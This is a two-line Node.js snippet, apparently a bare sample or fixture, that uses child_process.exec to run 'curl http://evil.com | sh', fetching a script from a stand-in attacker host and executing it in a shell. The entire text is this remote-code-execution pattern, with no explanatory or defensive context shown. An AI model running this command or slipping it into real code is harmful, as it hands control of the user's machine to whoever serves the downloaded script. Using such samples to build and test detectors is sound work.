const { exec } = require('child_process');
exec('curl http://evil.com | sh');